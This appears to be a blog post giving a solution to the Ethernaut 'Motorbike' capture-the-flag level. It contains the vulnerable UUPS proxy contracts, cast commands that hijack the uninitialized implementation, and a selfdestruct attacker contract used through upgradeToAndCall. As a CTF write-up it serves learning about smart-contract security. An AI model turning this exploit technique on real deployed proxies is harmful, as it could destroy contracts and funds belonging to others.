@@ -1,0 +1,167 @@
+---
+title: Ethernaut - Motorbike - Solution
+date: '2024-06-18'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Motorbike CTF
+---
+
+# Ethernaut - Motorbike - Solution
+
+**IMPORTANT:** `selfdestruct` has been deprecated. 
+Starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see [EIP-6780](https://eips.ethereum.org/EIPS/eip-6780)).
+Since a contract has empty code during construction, it's no longer possible to successfully execute the `delegatecall` that's required to solve this level.
+For this reason, we'll only discuss the originally intended pre-Cancun solution in this post.
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity <0.7.0;
+
+import "openzeppelin-contracts-06/utils/Address.sol";
+import "openzeppelin-contracts-06/proxy/Initializable.sol";
+
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) public {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback() external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r_slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+
+        AddressSlot storage r;
+        assembly {
+            r_slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to `selfdestruct` the `Engine` contract.
+
+Before we discuss the solution, I would highly recommend reading [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) and the [Initializable version](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) relevant for this level.
+In addition, it's a good idea to build a simple UUPS Proxy yourself by following [this tutorial](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) or any other introductory UUPS Proxy tutorial on YouTube, etc.
+
+The first difference between a UUPS Proxy and the Transparent Proxy Pattern is that the former has the upgrade logic in the implementation contract while the latter has it in the proxy.
+The other difference is that UUPS Proxies define a dedicated storage slot that stores the address of the logic contract in order to prevent storage collisions.
+
+In this level, `Motorbike` is the proxy and `Engine` is the implementation contract.
+The first thing we notice is that `Engine` does not contain any `selfdestruct` functionality.
+Thus, we will have to solve this level by finding a way to upgrade `Engine` so that the new version contains a `selfdestruct` that we can call.
+
+To upgrade the implementation, `Engine` contains an `upgradeToAndCall()` function.
+However, this function can only be called by the `upgrader`.
+Therefore, we first need to find a way to register our player address as the `upgrader`.
+
+To achieve this, notice that `Motorbike` calls `initialize()` via `delegatecall()`, leaving the storage of `Initializable` unaffected!
+In particular, the `initialized` state variable will continue to be `false`, even after `Motorbike` has initialized the `Engine`!
+Consequently, we can become the `upgrader` by calling `initialize()` directly from our player EOA.
+
+First, we determine the `Engine`'s address via
+
+```bash
+cast storage <your level instance> 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $SEP_RPC_URL
+```
+
+and subsequently call `initialize()` via:
+
+```bash
+cast send <your Engine address> "initialize()" --rpc-url $SEP_RPC_URL --private-key <your private key>
+```
+
+Now that we are the `upgrader`, we deploy the following attacker contract so that we can subsequently upgrade our `Engine` to it:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MotorbikeAttacker {
+    function destroy() external {
+        selfdestruct(payable(address(0)));
+    }    
+}
+```
+
+To complete the attack, we can now call `upgradeToAndCall()` from our player EOA, providing `MotorbikeAttacker`'s address as the first parameter and `destroy()`'s function selector, 0x83197ef0, as the second.
